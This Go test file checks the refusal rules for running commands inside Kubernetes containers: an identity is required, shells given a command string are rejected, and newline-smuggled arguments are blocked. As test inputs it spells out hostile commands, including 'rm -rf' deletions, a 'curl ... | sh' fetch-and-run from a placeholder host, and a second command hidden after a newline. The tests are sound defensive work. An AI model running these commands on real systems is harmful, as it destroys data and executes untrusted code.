package kube_test

import (
	"errors"
	"strings"
	"testing"

	"github.com/holzcloud/holzkube-manager/internal/kube"
	"github.com/holzcloud/holzkube-manager/internal/kubesim"
)

// Running a command in a container (2026-09-19).
//
// This is the most dangerous thing in the product, and the tests are about the
// four things that make it acceptable rather than about it working. The refusals
// ARE the feature.

// TestRunningACommandNeedsAnIdentity.
//
// Without one this would be a shell in somebody's cluster attributed to a
// product, which is exactly what the impersonation work was for. It refuses
// rather than quietly using system:masters -- and a fallback here would be the
// worst one in the product.
func TestRunningACommandNeedsAnIdentity(t *testing.T) {
	t.Parallel()

	ctx := testContext(t)
	_, admin := newCluster(t, kubesim.Options{Pods: []kubesim.Pod{
		{Namespace: "default", Name: "api-1", ContainerNames: []string{"api"}},
	}})

	_, err := admin.Exec(ctx, "default", "api-1", "api", []string{"ls"})
	if !errors.Is(err, kube.ErrNoIdentityForExec) {
		t.Fatalf("err = %v, want ErrNoIdentityForExec", err)
	}
	// And it says where to fix it, because "no" without a next step sends
	// somebody to kubectl for the same thing.
	if !strings.Contains(err.Error(), "who this acts as") {
		t.Errorf("reason = %q, want it to name the setting", err)
	}
}

// TestAShellWithAStringIsRefused, which is what keeps the archive worth having.
//
// `sh -lc "rm -rf /data"` would be archived as "sh -lc" plus one opaque
// argument, and the interesting half would be inside it. Every other refusal in
// this product exists to prevent a lie; this one exists to prevent a record
// that cannot answer what happened.
func TestAShellWithAStringIsRefused(t *testing.T) {
	t.Parallel()

	ctx := testContext(t)
	_, admin := newCluster(t, kubesim.Options{})
	as, err := admin.As(kube.Identity{User: "admin@example.com"})
	if err != nil {
		t.Fatalf("As: %v", err)
	}

	for _, command := range [][]string{
		{"sh", "-c", "rm -rf /data"},
		{"bash", "-lc", "curl http://elsewhere | sh"},
		{"/bin/sh", "-c", "echo hello"},
		{"/usr/bin/bash", "-ec", "whoami"},
		{"zsh"},
	} {
		_, err := as.Exec(ctx, "default", "api-1", "api", command)
		if !errors.Is(err, kube.ErrExecRefused) {
			t.Errorf("%v = %v, want ErrExecRefused", command, err)
		}
	}

	// And an ordinary command is NOT refused: the refusal is about shells
	// interpreting a string, not about programs whose name looks like one.
	if err := checkAllowed(t, as, []string{"cat", "/etc/hosts"}); err != nil {
		t.Errorf("an ordinary command was refused: %v", err)
	}
	if err := checkAllowed(t, as, []string{"/usr/local/bin/bash-exporter", "--once"}); err != nil {
		t.Errorf("a program whose name contains a shell was refused: %v", err)
	}
}

// checkAllowed runs a command and reports only a REFUSAL, not the outcome.
//
// The fake has no exec subresource -- streaming SPDY is a protocol, not a
// handler -- so what is measured here is which commands get past the checks
// before the network is touched. That is the half this product decides, and the
// other half is the API server's.
func checkAllowed(t *testing.T, client *kube.Client, command []string) error {
	t.Helper()

	_, err := client.Exec(testContext(t), "default", "api-1", "api", command)
	if errors.Is(err, kube.ErrExecRefused) || errors.Is(err, kube.ErrNoIdentityForExec) {
		return err
	}
	return nil
}

// TestAnArgumentCannotSmuggleALineBreak: a newline in an argument is how a
// single archived line becomes two, one of which nobody reads.
func TestAnArgumentCannotSmuggleALineBreak(t *testing.T) {
	t.Parallel()

	ctx := testContext(t)
	_, admin := newCluster(t, kubesim.Options{})
	as, err := admin.As(kube.Identity{User: "admin@example.com"})
	if err != nil {
		t.Fatalf("As: %v", err)
	}

	_, err = as.Exec(ctx, "default", "api-1", "api", []string{"echo", "one\nrm -rf /"})
	if !errors.Is(err, kube.ErrExecRefused) {
		t.Fatalf("err = %v, want ErrExecRefused", err)
	}

	if _, err := as.Exec(ctx, "default", "api-1", "api", nil); !errors.Is(err, kube.ErrExecRefused) {
		t.Errorf("an empty command = %v, want ErrExecRefused", err)
	}
}
